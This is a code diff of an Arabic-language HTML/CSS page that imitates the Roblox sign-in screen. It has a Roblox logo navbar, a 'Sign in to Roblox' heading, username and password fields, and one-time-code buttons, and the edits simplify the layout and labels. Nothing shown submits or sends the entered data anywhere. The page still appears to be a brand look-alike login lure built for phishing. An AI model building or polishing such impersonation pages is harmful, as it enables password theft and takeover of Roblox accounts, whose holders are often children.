@@ -20,13 +20,11 @@ body{
   align-items:center;
   padding:0 18px;
 }
-
 .logo{
   font-size:24px;
   font-weight:900;
   margin-right:20px;
 }
-
 .links{
   display:flex;
   gap:18px;
@@ -37,26 +35,8 @@ body{
   font-size:14px;
 }
 .links a:hover{color:white}
-
-/* البحث */
-.search{
-  margin:auto;
-  display:flex;
-  align-items:center;
-  background:#222;
-  border-radius:8px;
-  padding:6px 12px;
-}
-.search input{
-  background:transparent;
-  border:none;
-  color:white;
-  outline:none;
-  width:260px;
-}
-
-/* الأزرار */
 .actions{
+  margin-left:auto;
   display:flex;
   gap:10px;
 }
@@ -75,11 +55,11 @@ body{
   border-radius:8px;
 }
 
-/* الصندوق */
+/* الصفحة */
 .main{
   display:flex;
   justify-content:center;
-  margin-top:50px;
+  margin-top:60px;
 }
 .box{
   background:#23262f;
@@ -93,7 +73,7 @@ body{
   border-radius:10px;
   margin-bottom:15px;
 }
-.box h2{text-align:center;}
+.box h2{margin:10px 0;}
 .box input{
   width:100%;
   padding:12px;
@@ -121,41 +101,36 @@ body{
   color:white;
   margin-top:10px;
 }
-.small{text-align:center;font-size:13px;color:#ccc;margin:12px 0;}
+.small{font-size:13px;color:#ccc;margin:12px 0;}
 .line{height:1px;background:#444;margin:15px 0;}
 </style>
 </head>
+
 <body>
 
 <div class="navbar">
   <div class="logo">ROBLOX</div>
-
   <div class="links">
     <a href="#">الرئيسية</a>
     <a href="#">السوق</a>
     <a href="#">إنشاء</a>
     <a href="#">Robux</a>
   </div>
-
-  <div class="search">
-    <input type="text" placeholder="بحث">
-  </div>
-
   <div class="actions">
     <button class="btn-blue">تسجيل الدخول</button>
-    <button class="btn-dark">تسجيل الدخول</button>
+    <button class="btn-dark">تسجيل</button>
   </div>
 </div>
 
 <div class="main">
 <div class="box">
 
-  <!-- غير الرابط هنا لصورتك -->
-  <img class="hero-img" src="https://i.imgur.com/4AiXzf8.jpeg" alt="Roblox">
+  <!-- الصورة -->
+  <img src="IMG_0161.png" class="hero-img">
 
   <h2>تسجيل الدخول إلى Roblox</h2>
 
-  <input type="text" placeholder="اسم المستخدم / البريد الإلكتروني">
+  <input type="text" placeholder="اسم المستخدم">
   <input type="password" placeholder="كلمة المرور">
 
   <button class="mainbtn">تسجيل الدخول</button>
@@ -163,10 +138,11 @@ body{
   <div class="small">نسيت كلمة المرور أو اسم المستخدم؟</div>
   <div class="line"></div>
 
-  <button class="sec">إرسال رمز صالح لمرة واحدة عبر البريد الإلكتروني</button>
+  <button class="sec">إرسال رمز لمرة واحدة عبر البريد</button>
   <button class="sec">تسجيل دخول سريع</button>
 
   <div class="small">ليس لديك حساب؟ اشترك</div>
+
 </div>
 </div>
 
